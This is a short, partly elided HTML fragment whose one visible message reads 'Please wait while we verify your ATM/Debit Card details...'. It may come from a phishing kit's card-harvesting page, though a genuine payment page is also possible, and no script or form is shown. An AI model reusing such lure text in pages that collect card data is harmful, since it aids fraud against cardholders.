...
<meta name="theme-color" content="#ffffff">
    ...
    <div id="ha">
    <center><h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we verify your ATM/Debit Card details...  </h4></center>
    </div>
    <div id="ba">
